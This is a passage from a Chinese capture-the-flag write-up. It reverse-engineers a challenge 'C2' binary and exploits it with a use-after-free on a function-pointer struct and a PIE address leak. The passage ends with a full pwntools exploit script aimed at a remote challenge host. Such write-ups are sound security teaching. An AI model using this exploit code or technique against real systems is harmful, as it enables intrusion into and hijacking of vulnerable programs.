      break;
    case 'C':
      *agent = createAccount;
      puts("===========================");
      puts("Registration Form : ");
      puts("Enter your username: ");
      v1 = agent;
      UserInput = getUserInput();
      v1[1] = UserInput;
      break;
    case 'E':
      LODWORD(UserInput) = (_DWORD)agent;
      *agent = exitProgram;
      break;
    case 'F':
      LODWORD(UserInput) = Hackupdate();
      break;
    case 'H':
      if ( agent )
      {
        LODWORD(UserInput) = (_DWORD)agent;
        *agent = printID;
      }
      else
      {
        LODWORD(UserInput) = puts("Not logged in!");
      }
      break;
    case 'K':
      LODWORD(UserInput) = (_DWORD)agent;
      *agent = Checkstatus;
      break;
    default:
      puts("Invalid option!");
      exit(1);
  }
  return UserInput;
}
```

每个对应选项都会将 `agent` 的值设置为对应选项要执行的函数的地址。

其中 `E` 选项会将 `agent` 设置为 `exitProgram`：

```c del={12}
unsigned __int64 exitProgram()
{
  char v1; // [rsp+7h] [rbp-9h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Sure you want to leave the clan (Y/N)? ");
  __isoc99_scanf(" %c", &v1);
  if ( toupper(v1) == 89 )
  {
    puts("Congrats on quitting the revolution");
    free(agent);
  }
  else
  {
    puts("Ok.");
  }
  return v2 - __readfsqword(0x28u);
}
```

我们看到它将 `agent` 释放了，这样我们下次分配同样大小空间的时候就会复用原先 `agent` 的地址，如果我们复用地址后还能对其进行写入，那就可以将其改成 `getSecret` 的地址了。

那么我们现在需要的就是找到这样一个 malloc，它将获取 `0x10` 的空间，我们发现 `F` 中的 `Hackupdate` 函数是：

```c del={6-7}
ssize_t Hackupdate()
{
  void *buf; // [rsp+8h] [rbp-8h]

  puts("How did your previous hack go? ");
  buf = malloc(8uLL);
  return read(0, buf, 8uLL);
}
```

malloc 了 `0x8` 字节，加上 metadata 再对齐一下，和 `malloc(0x10);` 分配的大小应该是一样的，这样一来就成功复用了 `agent` 的地址，并且，紧接着它会调用 `read` 向这个地址写入数据。

现在我们只差临门一脚了。由于这个程序开启了 PIE 保护，所以我们得想办法泄漏程序基地址才能计算出 `getSecret` 的物理地址。

我们发现使用 `H` 选项会输出一个地址，而这个地址看上去很像程序内部的指令地址：

```plaintext
Command and Control Centere.
==========================
(H) Generate ID for the agent
(A) Begin a new cyber operation
(C) Create a new Agent
(K) Check status of current cyber operation
(F) Provide updates about your current hack.)
(E) Exit
> H
User ID: 0x5609404d243c
```

看其对应的反编译代码，调用了 `generateUserID`，然后通过 `printf` 输出返回值：

```c del={3}
int printID()
{
  return printf("User ID: %p\n", generateUserID);
}
```

```c {22}
char *generateUserID()
{
  int v0; // eax
  unsigned int i; // [rsp+4h] [rbp-Ch]
  FILE *stream; // [rsp+8h] [rbp-8h]

  if ( !initialized_1 )
  {
    memset(userid_0, 48, sizeof(userid_0));
    stream = fopen("/dev/urandom", "rb");
    if ( stream )
    {
      for ( i = 0; i <= 0x1F; i += 2 )
      {
        v0 = fgetc(stream);
        sprintf(&userid_0[i], "%02hhx", v0);
      }
      fclose(stream);
    }
    initialized_1 = 1;
  }
  return userid_0;
}
```

`generateUserID` 会从 `/dev/urandom` 读取 `0x10` 字节数据到 `userid_0` 数组中，并将 `userid_0` 的地址作为 64-bit 指针返回。

值得注意的是，我们不关心从 `/dev/urandom` 里面读到的垃圾数据，`generateUserID` 返回的是 `userid_0` 在程序中的地址，而非从 `/dev/urandom` 里读到的值。并且 `printf` 使用的是 `%p` 格式化字符，而非 `%s`，所以最终打印的是 `userid_0` 在程序中的地址。虽然它属于 `.bss` 段，但是开启 PIE 会随机化整个程序的加载地址，故通过这个地址减去它和 PIE 基址之间的偏移，就得到了实际 PIE 基地址。

下面就可以愉快地编写 exploit 了。

呼呼呼，总算写完了……从早上一起来就开始分析这道题，逆向 rust 程序部分大概花了我三小时（其中有一个多小时都是在浪费时间……），逆完拿到 C2 后，一看尼玛怎么是 heap exploitation，不会啊！只觉一阵无力感瞬间袭上心头，flag 近在眼前，我明明已经解决了整个 challenge 中最困难的逆向部分，却倒在了这个看上去不怎么难的堆利用上……洗洗睡了，睡了三小时，半个下午都在无梦中度过……起来发了几句牢骚，又继续研究这个 C2。凭借着脑海中那一点点可怜的 heap exploitation 知识，试图把它突突。结果没想到起来后研究了四十分钟解决了……不算难，甚至可以说很简单……一开始以为漏洞点在 `getUserInput` 中，浪费了一半多的时间……

最后，这应该是我分析过的最复杂的一个程序，虽然感觉完全就是在做 forensics，pwn 的部分占比有点太小了. 当然，Yan85 VM 分析起来也不比它容易多少，不过这个 challenge 毕竟是 rust 写的，也是我第一次逆向 rust 程序。果然，rust 不用 `unsafe` 还是很难写出有漏洞的代码的，除非是逻辑漏洞。所以总的来说做完感觉并不是那么牛逼，反而觉得简直不要太简单，但期间还是走了不少弯路，浪费了太多时间，也是难免的……

老实说，在逆向分析的时候，我就是一路猜猜猜，凭借着直觉拿到的 C2，而不是实际的逆向分析能力。但是，实力决定下限，直觉决定上限，实力也是直觉的基础。我觉得有这样敏锐的直觉对于比赛中快速解题还是有很大帮助的，不过有时候直觉容易与事实混淆，可能导致自己掉到坑里困上好几个小时也说不准。总之，应该同时培养逆向分析的硬实力和像直觉这样的软实力，知道什么时候应该深入分析代码，什么时候应该跟着直觉走。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)

FILE = "./tictactoe"
HOST, PORT = "94.237.48.12", 35762

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def decrypt(encrypted):
    return bytes(byte ^ 0x5A for byte in encrypted)


def main():
    target = launch()

    target.sendlineafter(b": ", b"0 0")
    target.sendlineafter(b": ", b"0 4")
    target.sendlineafter(b": ", b"1 1")
    target.sendlineafter(b": ", b"1 3")
    target.sendlineafter(b": ", b"2 2")
    target.sendlineafter(b": ", b"3 1")
    target.sendlineafter(b": ", b"3 3")
    target.sendlineafter(b": ", b"4 0")
    target.sendlineafter(b": ", b"4 4")
    target.sendlineafter(b": ", b"cub3y0nd")

    plaintext = decrypt(b"\x1ei<k4i.6#;mk9mn9mji=;7i")
    target.sendlineafter(b": ", plaintext)

    raw_input("DEBUG")
    elf = ELF("/tmp/C2_executable")

    target.sendlineafter(b"> ", b"H")
    target.recvuntil(b"ID: ")

    piebase = int(target.recvline(), 16) - 0x143C

    target.sendlineafter(b"> ", b"E")
    target.sendlineafter(b"? ", b"Y")
    target.sendlineafter(b"> ", b"F")

    payload = flat(piebase + elf.sym["getSecret"], 0)
    target.sendlineafter(b"?", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```
